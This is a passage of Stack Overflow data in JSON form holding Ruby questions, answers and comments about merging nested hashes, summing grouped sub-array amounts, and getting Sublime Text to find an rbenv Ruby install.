. If you want to see the whole code i will add it tomorrow."}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535395084, "post_id": 52041958, "comment_id": 91041231, "body": "@Rajagopalan There is no need to add the whole code (it clutters the question), I just wanted to make sure that your approach was intentional."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "reply_to_user": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535395579, "post_id": 52041958, "comment_id": 91041469, "body": "@Johan Wentholt okay, thanks."}], "answers": [{"comments": [{"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1535386887, "post_id": 52043253, "comment_id": 91037536, "body": "Hi, thank you , this is nearly perfect and that&#39;s what I want but in a my given output, If action is nil then that should be in output and also if key which is not available in the action is available in the test, that should not be included in the resultant set but your output is including that as well."}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 1, "creation_date": 1535399421, "post_id": 52043253, "comment_id": 91043182, "body": "Also <code>action = hash[&#39;Action&#39;].compact</code>"}, {"owner": {"reputation": 1081, "user_id": 1288687, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7217dd12520210182c093856f60cd376?s=128&d=identicon&r=PG", "display_name": "knugie", "link": "https://stackoverflow.com/users/1288687/knugie"}, "reply_to_user": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1535401807, "post_id": 52043253, "comment_id": 91044086, "body": "@Rajagopalan addressed comment, I updated my answer to reject all values containing only one element."}], "tags": [], "owner": {"reputation": 1081, "user_id": 1288687, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7217dd12520210182c093856f60cd376?s=128&d=identicon&r=PG", "display_name": "knugie", "link": "https://stackoverflow.com/users/1288687/knugie"}, "is_accepted": false, "score": 2, "last_activity_date": 1535401707, "last_edit_date": 1535401707, "creation_date": 1535386393, "answer_id": 52043253, "question_id": 52041958, "link": "https://stackoverflow.com/questions/52041958/how-to-merge-the-hash-this-way/52043253#52043253", "title": "How to merge the hash this way", "body": "<p>Generally speaking, it might be a good idea to build up the desired data structure while dealing with the underlaying data objects. However, if you need to transform you hash afterwards, here is one way to do that:</p>\n\n<pre><code>hash = {\n    \"Action\"=&gt;{\"css=#entityType\"=&gt;\"Type\", \"id=idNumber\"=&gt;\"TypeAndWait\", \"id=shortName\"=&gt;\"TypeAndTab\", \"id=FirstName\"=&gt;\"TypeTabAndWait\", nil=&gt;nil}, \n    \"Test1\"=&gt;{\"css=#entityType\"=&gt;\"Individual\", \"id=idNumber\"=&gt;\"2323\", \"id=shortName\"=&gt;\"M\", \"id=FirstName\"=&gt;\"Abc\", \"id=lastName\"=&gt;\"Gg\"}, \n    \"Test2\"=&gt;{\"css=#entityType\"=&gt;\"Legal\", \"id=idNumber\"=&gt;\"2323\", \"id=shortName\"=&gt;\"Z\", \"id=FirstName\"=&gt;\"Xyz\", \"id=lastName\"=&gt;\"Gg\"}\n  }\n\naction = hash['Action']\ntests = hash.reject { |k, v| k == 'Action' }\n\n\nmapping = tests.map do |name, test|\n  groups = (action.to_a + test.to_a).group_by(&amp;:first)\n  no_keys = groups.map { |k, v| [k, v.each(&amp;:shift).flatten] }\n  no_keys.reject! { |k, v| v.length == 1 }\n  [name, Hash[no_keys]]\nend\n\nHash[mapping]\n#  =&gt; {\"Test1\"=&gt;{\"css=#entityType\"=&gt;[\"Type\", \"Individual\"], \"id=idNumber\"=&gt;[\"TypeAndWait\", \"2323\"], \"id=shortName\"=&gt;[\"TypeAndTab\", \"M\"], \"id=FirstName\"=&gt;[\"TypeTabAndWait\", \"Abc\"]},\n#      \"Test2\"=&gt;{\"css=#entityType\"=&gt;[\"Type\", \"Legal\"], \"id=idNumber\"=&gt;[\"TypeAndWait\", \"2323\"], \"id=shortName\"=&gt;[\"TypeAndTab\", \"Z\"], \"id=FirstName\"=&gt;[\"TypeTabAndWait\", \"Xyz\"]}}\n</code></pre>\n\n<p>I hope you find that useful.</p>\n"}, {"comments": [{"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1535387345, "post_id": 52043314, "comment_id": 91037738, "body": "Hi, thats perfect , I wrongly given the &quot;id=&quot;last name&quot; instead of &quot;id=last name&quot; as key and this key is not in action so this should not come in result ."}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 1, "creation_date": 1535389202, "post_id": 52043314, "comment_id": 91038575, "body": "This can be further simplified to a merge block of: <code>{ |k, *vs| vs }</code>."}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "reply_to_user": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535389651, "post_id": 52043314, "comment_id": 91038766, "body": "@JohanWentholt, thanks did&#39;t know this, added to my knowledge."}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535391917, "post_id": 52043314, "comment_id": 91039811, "body": "@iGian I <a href=\"https://stackoverflow.com/a/52044462/3982562\">expanded a bit on your answer</a>, hope you don&#39;t mind. You&#39;re free to include my expansion into your answer if you want. If you do, notify my by leaving a comment under my answer so I can remove it."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "reply_to_user": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535394427, "post_id": 52043314, "comment_id": 91040950, "body": "@Johan Wentholt please don&#39;t remove it, I want your answer."}], "tags": [], "owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "is_accepted": true, "score": 2, "last_activity_date": 1535389528, "last_edit_date": 1535389528, "creation_date": 1535386641, "answer_id": 52043314, "question_id": 52041958, "link": "https://stackoverflow.com/questions/52041958/how-to-merge-the-hash-this-way/52043314#52043314", "title": "How to merge the hash this way", "body": "<p>If I understand you want something like this</p>\n\n<pre><code>hash_1 = {a: \"a1\", b: \"b1\", c: \"c1\"}\nhash_2 = {a: \"a2\", b: \"b2\", d: \"d1\"}\n\np hash_1.merge(hash_2) { |k, v1, v2| v1 = [v1, v2] }\n# =&gt; {:a=&gt;[\"a1\", \"a2\"], :b=&gt;[\"b1\", \"b2\"], :c=&gt;\"c1\", :d=&gt;\"d1\"}\n</code></pre>\n\n<p>Which in your case can be:</p>\n\n<pre><code>test_1_value = my_hash['Test1'].merge(my_hash['Action']) { |k, v1, v2| v1 = [v1, v2] }\n\n# =&gt; {\"css=#entityType\"=&gt;[\"Individual\", \"Type\"], \"id=idNumber\"=&gt;[\"2323\", \"TypeAndWait\"], \"id=shortName\"=&gt;[\"M\", \"TypeAndTab\"], \"id=FirstName\"=&gt;[\"Abc\", \"TypeTabAndWait\"], \"id=\\\"lastName\"=&gt;\"Gg\", nil=&gt;nil}\n</code></pre>\n\n<p>This is a general solution, you can manipulate furthermore removing the unwanted keys ad apply to fit your needs.</p>\n\n<h3>Edit - picking up comments</h3>\n\n<p>Remove unwanted keys and simplified merge block:</p>\n\n<pre><code>keys_to_remove = [\"id=lastName\", \"whatever\", nil]\ntest_1_value = my_hash['Test1'].merge(my_hash['Action']) { |k, *vs| vs }.delete_if{ |k, _| keys_to_remove.include? k }\n# =&gt; {\"css=#entityType\"=&gt;[\"Individual\", \"Type\"], \"id=idNumber\"=&gt;[\"2323\", \"TypeAndWait\"], \"id=shortName\"=&gt;[\"M\", \"TypeAndTab\"], \"id=FirstName\"=&gt;[\"Abc\", \"TypeTabAndWait\"]}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1535392030, "post_id": 52044462, "comment_id": 91039859, "body": "That&#39;s much better but Unwanted values can&#39;t known like you have done! If action doesn&#39;t have the key and that key exists in the test hash then it&#39;s unwanted key."}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "reply_to_user": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1535392176, "post_id": 52044462, "comment_id": 91039920, "body": "@Rajagopalan Ah, that clears things up. I&#39;ll add it in."}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "reply_to_user": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1535393024, "post_id": 52044462, "comment_id": 91040312, "body": "Oh, I might have interpreted it wrong. I <a href=\"https://stackoverflow.com/revisions/52044462/3\">currently</a> merge only the action keys that are in the test. I guess this should be the other way around."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1535393236, "post_id": 52044462, "comment_id": 91040407, "body": "Amazing, actually yours is more perfect, I have invited your answer. Thanks."}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 0, "creation_date": 1535399083, "post_id": 52044462, "comment_id": 91043030, "body": "@JohanWentholt Excellent! There is always room for improvement and learning. Also, there is not scarcity of upvotes, so.."}], "tags": [], "owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "is_accepted": false, "score": 2, "last_activity_date": 1535398036, "last_edit_date": 1535398036, "creation_date": 1535391724, "answer_id": 52044462, "question_id": 52041958, "link": "https://stackoverflow.com/questions/52041958/how-to-merge-the-hash-this-way/52044462#52044462", "title": "How to merge the hash this way", "body": "<p>I want to expand on <a href=\"https://stackoverflow.com/a/52043314/3982562\">iGians answer</a>. Although the answer describes how the issue should be solved, it didn't use any iteration. You can iterate over the tests in the following way:</p>\n\n<pre><code>hash = {\n  \"Action\"=&gt;{\"css=#entityType\"=&gt;\"Type\", \"id=idNumber\"=&gt;\"TypeAndWait\", \"id=shortName\"=&gt;\"TypeAndTab\", \"id=FirstName\"=&gt;\"TypeTabAndWait\", nil=&gt;nil}, \n  \"Test1\"=&gt;{\"css=#entityType\"=&gt;\"Individual\", \"id=idNumber\"=&gt;\"2323\", \"id=shortName\"=&gt;\"M\", \"id=FirstName\"=&gt;\"Abc\", \"id=lastName\"=&gt;\"Gg\"}, \n  \"Test2\"=&gt;{\"css=#entityType\"=&gt;\"Legal\", \"id=idNumber\"=&gt;\"2323\", \"id=shortName\"=&gt;\"Z\", \"id=FirstName\"=&gt;\"Xyz\", \"id=lastName\"=&gt;\"Gg\"},\n}\n\naction = hash.delete 'Action'\ntests = hash\n\ntests.each_value do |test|\n  action_with_test_keys = action.select { |key, _value| test.key? key }\n  test.merge!(action_with_test_keys) { |_key, *values| values } # values = [old, new]\nend\n</code></pre>\n\n<p>This assumes that <code>'Action'</code> is the only non-test key in the hash and all other values should be merged with the <code>'Action'</code> value. <strong>Keep in mind that this approach mutates the <code>hash</code> variable. If you don't want this you should simply <a href=\"http://ruby-doc.org/core-2.5.1/Object.html#method-i-dup\" rel=\"nofollow noreferrer\"><code>#dup</code></a> the hash beforehand or look for a non-mutating approach.</strong></p>\n\n<p><strong>Optimizations</strong>:</p>\n\n<p>If you use Ruby 2.5.0 or higher you can use <a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-slice\" rel=\"nofollow noreferrer\"><code>#slice</code></a> instead of <a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-select\" rel=\"nofollow noreferrer\"><code>#select</code></a>.</p>\n\n<pre><code>action.select { |key, _value| test.key? key }\n# is replaced with\naction.slice(*test.keys)\n</code></pre>\n\n<p>If you are 100% sure that each <code>test</code> in <code>tests</code> contains the same keys and there is always at least one test present, you could move the <code>action_with_test_keys</code> assignment out of the <code>#each_value</code> block to save resources.</p>\n\n<pre><code>tests = hash # anchor point in the above solution\naction_with_test_keys = action.slice(*tests.values.first.keys) # added\n</code></pre>\n\n<p><strong>References</strong>:</p>\n\n<ul>\n<li><a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-delete\" rel=\"nofollow noreferrer\"><code>Hash#delete</code></a> to remove the <code>'Action'</code> key from the <code>hash</code> variable.</li>\n<li><a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-each_value\" rel=\"nofollow noreferrer\"><code>Hash#each_value</code></a> to iterate over each value of <code>tests</code>.</li>\n<li><a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-select\" rel=\"nofollow noreferrer\"><code>Hash#select</code></a> to select only the <code>action</code> keys that are present on <code>test</code>.</li>\n<li><a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-key-3F\" rel=\"nofollow noreferrer\"><code>Hash#key?</code></a> to check if the given key is present.</li>\n<li><a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-merge-21\" rel=\"nofollow noreferrer\"><code>Hash#merge!</code></a> to merge <code>action_with_test_keys</code> and update the <code>test</code> variable.</li>\n<li><a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-slice\" rel=\"nofollow noreferrer\"><code>Hash#slice</code></a> replacement for <code>Hash#select</code> if you use Ruby 2.5.0 or higher.</li>\n</ul>\n"}], "owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 0, "accepted_answer_id": 52043314, "answer_count": 3, "score": 1, "last_activity_date": 1535401707, "creation_date": 1535381689, "last_edit_date": 1535387212, "question_id": 52041958, "link": "https://stackoverflow.com/questions/52041958/how-to-merge-the-hash-this-way", "title": "How to merge the hash this way", "body": "<p>I have written a huge code something like below</p>\n\n<pre><code> headers, *data_rows = @testCaseSheet\n    local = headers.zip(*data_rows)\n    local = local[1..-1].map {|dataRow| local[0].zip(dataRow).to_h}\n    testCaseHash = {}\n    local.each do |value|\n      testCaseHash[value[\"Locator\"]] = value.tap {|hs| hs.delete(\"Locator\")}\n    end\n    @testCaseSheet = []\n    p testCaseHash\n    [h[\"Test Name\"], testCaseHash],\n</code></pre>\n\n<p>which output me this as below, now I need to merge this action with each test, I don't know how to do this. </p>\n\n<pre><code>hash= {\"Action\"=&gt;{\"css=#entityType\"=&gt;\"Type\", \"id=idNumber\"=&gt;\"TypeAndWait\", \"id=shortName\"=&gt;\"TypeAndTab\", \"id=FirstName\"=&gt;\"TypeTabAndWait\", nil=&gt;nil}, \n\n\"Test1\"=&gt;{\"css=#entityType\"=&gt;\"Individual\", \"id=idNumber\"=&gt;\"2323\", \"id=shortName\"=&gt;\"M\", \"id=FirstName\"=&gt;\"Abc\", \"id=lastName\"=&gt;\"Gg\"}, \n\n\"Test2\"=&gt;{\"css=#entityType\"=&gt;\"Legal\", \"id=idNumber\"=&gt;\"2323\", \"id=shortName\"=&gt;\"Z\", \"id=FirstName\"=&gt;\"Xyz\", \"id=lastName\"=&gt;\"Gg\"}}\n</code></pre>\n\n<p>Now I want to merge this action with the followings tests for an example,</p>\n\n<pre><code>hash= { \"Test1\"=&gt;{\"css=#entityType\"=&gt;[\"Individual\",\"Type\"], \"id=idNumber\"=&gt;[\"2323\",\"TypeAndWait\"], \"id=shortName\"=&gt;[\"M\",\"TypeAndTab\"], \"id=FirstName\"=&gt;[\"Abc\",\"TypeTabAndWait\"]}, \n\n\"Test2\"=&gt;{\"css=#entityType\"=&gt;[\"Legal\"\"Type\"], \"id=idNumber\"=&gt;[\"2323\",\"TypeAndWait\"], \"id=shortName\"=&gt;[\"Z\",\"TypeAndTab\"], \"id=FirstName\"=&gt;[\"Xyz\",\"TypeTabAndWait\"]}}\n</code></pre>\n\n<p>I don't know how to merge this way, Can anyone help me? </p>\n"}, {"tags": ["arrays", "ruby", "sub-array"], "answers": [{"tags": [], "owner": {"reputation": 8454, "user_id": 958529, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3ec25db39c63bab1a11037649e326b8?s=128&d=identicon&r=PG", "display_name": "halfelf", "link": "https://stackoverflow.com/users/958529/halfelf"}, "is_accepted": false, "score": 1, "last_activity_date": 1535381048, "creation_date": 1535381048, "answer_id": 52041773, "question_id": 52041642, "link": "https://stackoverflow.com/questions/52041642/how-to-group-elements-of-sub-arrays-based-on-two-elements/52041773#52041773", "title": "How to group elements of sub-arrays based on two elements", "body": "<pre><code>output = Hash.new(0)  # set a default value of zero, avoiding nil\ninput.each do |account, amount, transaction|\n    output[[account, transaction]] += amount\nend\n\noutput #  {[\"account1\", \"Dr\"]=&gt;30, [\"account2\", \"Cr\"]=&gt;15, [\"account1\", \"Cr\"]=&gt;35, [\"account2\", \"Dr\"]=&gt;10}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 476, "user_id": 2645167, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/IEnRe.jpg?s=128&g=1", "display_name": "andriy-baran", "link": "https://stackoverflow.com/users/2645167/andriy-baran"}, "is_accepted": false, "score": 4, "last_activity_date": 1535381102, "creation_date": 1535381102, "answer_id": 52041788, "question_id": 52041642, "link": "https://stackoverflow.com/questions/52041642/how-to-group-elements-of-sub-arrays-based-on-two-elements/52041788#52041788", "title": "How to group elements of sub-arrays based on two elements", "body": "<p>You can do so:</p>\n\n<pre><code>input.each_with_object(Hash.new(0)) {|(f,g,i), h| h[[f,i]] += g}\n\n=&gt; {[\"account1\", \"Dr\"]=&gt;30, [\"account2\", \"Cr\"]=&gt;15, [\"account1\", \"Cr\"]=&gt;35, [\"account2\", \"Dr\"]=&gt;10}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": false, "score": 2, "last_activity_date": 1535407333, "creation_date": 1535407333, "answer_id": 52047538, "question_id": 52041642, "link": "https://stackoverflow.com/questions/52041642/how-to-group-elements-of-sub-arrays-based-on-two-elements/52047538#52047538", "title": "How to group elements of sub-arrays based on two elements", "body": "<pre><code>input.group_by { |acc,_,title| [acc, title] }.\n      transform_values { |v| v.sum { |a| a[1] } }\n  #=&gt; {[\"account1\", \"Dr\"]=&gt;30, [\"account2\", \"Cr\"]=&gt;15, [\"account1\", \"Cr\"]=&gt;35,\n  #    [\"account2\", \"Dr\"]=&gt;10}\n</code></pre>\n\n<p>The first step is the following.</p>\n\n<pre><code>input.group_by { |acc,_,title| [acc, title] }\n  #=&gt; {\n  #    [\"account1\", \"Dr\"]=&gt;[[\"account1\", 10, \"Dr\"], [\"account1\", 20, \"Dr\"]],\n  #    [\"account2\", \"Cr\"]=&gt;[[\"account2\", 15, \"Cr\"]],\n  #    [\"account1\", \"Cr\"]=&gt;[[\"account1\", 25, \"Cr\"], [\"account1\", 10, \"Cr\"]],\n  #    [\"account2\", \"Dr\"]=&gt;[[\"account2\", 10, \"Dr\"]]\n  #   }\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 1960317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/274892a7240efb459570e3e9d122607f?s=128&d=identicon&r=PG", "display_name": "\u0c85\u0c9c\u0cbf\u0ca4\u0ccd \u0c9f\u0cbf", "link": "https://stackoverflow.com/users/1960317/%e0%b2%85%e0%b2%9c%e0%b2%bf%e0%b2%a4%e0%b3%8d-%e0%b2%9f%e0%b2%bf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1535425701, "creation_date": 1535380531, "last_edit_date": 1535425701, "question_id": 52041642, "link": "https://stackoverflow.com/questions/52041642/how-to-group-elements-of-sub-arrays-based-on-two-elements", "title": "How to group elements of sub-arrays based on two elements", "body": "<p>I have an input as follows:</p>\n\n<pre><code>input = [\n  [\"account1\",10,\"Dr\"],\n  [\"account1\",20,\"Dr\"],\n  [\"account2\",15,\"Cr\"],\n  [\"account1\",25,\"Cr\"],\n  [\"account2\",10,\"Dr\"],\n  [\"account1\",10,\"Cr\"]\n]\n</code></pre>\n\n<p>I am trying to get the sums by account and transaction type, i.e., <code>Dr</code> or <code>Cr</code>. I need an output as below:</p>\n\n<pre><code>output = {\n  [\"account1\",\"Dr\"] =&gt; 30,\n  [\"account1\",\"Cr\"] =&gt; 35,\n  [\"account2\",\"Dr\"] =&gt; 10,\n  [\"account2\",\"Cr\"] =&gt; 15\n}\n</code></pre>\n\n<p>I can sum the amount based on only account using:</p>\n\n<pre><code>input.each_with_object(Hash.new(0)) {|(f,g), h| h[f] += g}\n# =&gt; {\"account1\"=&gt;65, \"account2\"=&gt;25}\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "bash", "sublimetext"], "comments": [{"owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "edited": false, "score": 0, "creation_date": 1535380300, "post_id": 52041464, "comment_id": 91033796, "body": "Where is your ruby installed? From a bash prompt: <code>type -a ruby</code>"}, {"owner": {"reputation": 858, "user_id": 8870694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3f251f0bd3900352fc6eb4dcc6a124e?s=128&d=identicon&r=PG", "display_name": "Elta3lab", "link": "https://stackoverflow.com/users/8870694/elta3lab"}, "reply_to_user": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "edited": false, "score": 0, "creation_date": 1535380938, "post_id": 52041464, "comment_id": 91034175, "body": "ruby is /home/elta3lab/.rbenv/shims/ruby"}, {"owner": {"reputation": 1887, "user_id": 4948732, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-ZnN3lJjklJg/AAAAAAAAAAI/AAAAAAAAAWE/zqGtDAyXfjo/photo.jpg?sz=128", "display_name": "thesecretmaster", "link": "https://stackoverflow.com/users/4948732/thesecretmaster"}, "edited": false, "score": 0, "creation_date": 1535381247, "post_id": 52041464, "comment_id": 91034371, "body": "Have you tried something like <a href=\"https://apple.stackexchange.com/a/80580/246354\">this</a>?"}, {"owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "edited": false, "score": 1, "creation_date": 1535381365, "post_id": 52041464, "comment_id": 91034446, "body": "From the <code>path</code> error message, sublime cannot find that ruby. Try <code>PATH=&quot;$HOME&#47;.rbenv&#47;shims:$PATH&quot; sublime</code> to launch your editor. Or perhaps sublime has a configuration setting to specify the path to your ruby interpreter."}, {"owner": {"reputation": 858, "user_id": 8870694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3f251f0bd3900352fc6eb4dcc6a124e?s=128&d=identicon&r=PG", "display_name": "Elta3lab", "link": "https://stackoverflow.com/users/8870694/elta3lab"}, "reply_to_user": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "edited": false, "score": 0, "creation_date": 1535381697, "post_id": 52041464, "comment_id": 91034629, "body": "@glennjackman here&#39;s the output I got for  PATH=&quot;$HOME/.rbenv/shims:$PATH&quot; sublime .. sublime: command not found"}, {"owner": {"reputation": 16941, "user_id": 814803, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LUo4b.png?s=128&g=1", "display_name": "OdatNurd", "link": "https://stackoverflow.com/users/814803/odatnurd"}, "edited": false, "score": 0, "creation_date": 1535386377, "post_id": 52041464, "comment_id": 91037271, "body": "The path you see at the bottom of the build output is the path as Sublime sees it, which doesn&#39;t include the path <code>ruby</code> is apparently installed in. Is there some command that you need to execute in a fresh terminal in order to set up the path to ruby or something?"}, {"owner": {"reputation": 858, "user_id": 8870694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3f251f0bd3900352fc6eb4dcc6a124e?s=128&d=identicon&r=PG", "display_name": "Elta3lab", "link": "https://stackoverflow.com/users/8870694/elta3lab"}, "reply_to_user": {"reputation": 16941, "user_id": 814803, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LUo4b.png?s=128&g=1", "display_name": "OdatNurd", "link": "https://stackoverflow.com/users/814803/odatnurd"}, "edited": false, "score": 0, "creation_date": 1535399677, "post_id": 52041464, "comment_id": 91043278, "body": "@OdatNurd not sure but all I know is that sublime text can&#39;t read or detect ruby"}], "answers": [{"tags": [], "owner": {"reputation": 21, "user_id": 2152627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/103bba038c736100cb6b6fc4e5259a66?s=128&d=identicon&r=PG&f=1", "display_name": "Tiago Martins Ara&#250;jo", "link": "https://stackoverflow.com/users/2152627/tiago-martins-ara%c3%bajo"}, "is_accepted": false, "score": 0, "last_activity_date": 1535380353, "creation_date": 1535380353, "answer_id": 52041582, "question_id": 52041464, "link": 